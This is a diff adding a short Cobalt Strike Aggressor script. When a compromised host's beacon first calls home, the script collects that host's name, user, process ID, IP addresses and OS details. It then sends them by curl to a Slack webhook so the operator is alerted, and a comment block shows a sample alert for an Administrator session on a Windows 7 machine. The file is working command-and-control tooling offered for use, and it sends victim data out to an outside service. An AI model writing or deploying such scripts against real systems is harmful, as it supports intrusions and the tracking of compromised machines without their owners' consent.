@@ -1,0 +1,62 @@
+# author: arr0w1
+# Send the message to Slack when a Beacon calls home for the first time.(Replace the 'slack_webhookURL' with yours)
+#
+# For example, you will receive the following message when a Beacon calls home for the first time.
+#
+# ------msg------
+# teamserver_name: default
+# 
+# beacon id : 12542
+# beacon note :
+# computer name : WIN7-Jack
+# User : Administrator *
+# PID : 1140
+# host : 10.13.13.13
+# external IP : 127.0.0.1
+# internal IP : 10.13.13.13
+# port :
+# os : Windows
+# ver : 6.1
+# barch : x64
+# is64 : 1
+# charset : x-mswin-936
+# pbid :
+# phint : 0
+# alive : true
+# last : 301
+# lastf : 301ms
+# ------end------
+
+
+on beacon_initial {
+$one_bid = $1;
+$teamserver_name = "default";
+$slack_webhookURL = 'https://hooks.slack.com/services/TTTTTTTTT/BBBBBBBBB/abc01efL2345q6hhhAAAaj7';
+
+$msg = "\n------msg------\n" . 
+"teamserver_name: " . $teamserver_name  . "\n" .
+"\n\n"  . "\n" .
+"beacon id : " .beacon_info($one_bid, "id") . "\n" . 
+"beacon note : " . beacon_info($one_bid, "note") . "\n" . 
+"computer name : " . beacon_info($one_bid, "computer") . "\n" .
+beacon_info($one_bid, "note") . "\n" .
+"User : " .beacon_info($one_bid, "user") . "\n" .
+"PID : " . beacon_info($one_bid, "pid") . "\n" .
+"host : " . beacon_info($one_bid, "host") . "\n" .
+"external IP : " . beacon_info($one_bid, "external") . "\n" .
+"internal IP : " . beacon_info($one_bid, "internal") . "\n" .
+"port : " . beacon_info($one_bid, "port") . "\n" .
+"os : " . beacon_info($one_bid, "os") . "\n" .
+"ver : " . beacon_info($one_bid, "ver") . "\n" .
+"barch : " . beacon_info($one_bid, "barch") . "\n" .
+"is64 : " . beacon_info($one_bid, "is64") . "\n" .
+"charset : " . beacon_info($one_bid, "charset") . "\n" .
+"pbid : " . beacon_info($one_bid, "pbid") . "\n" .
+"phint : " . beacon_info($one_bid, "phint") . "\n" .
+"alive : " . beacon_info($one_bid, "alive") . "\n" .
+"last : " . beacon_info($one_bid, "last"). "\n" .
+"lastf : " . beacon_info($one_bid, "lastf"). "\n------end------\n";
+
+exec(@('curl','-X','POST','-H','Content-type: application/json','--data','{"text":"'.$msg.'"}',$slack_webhookURL));
+
+}
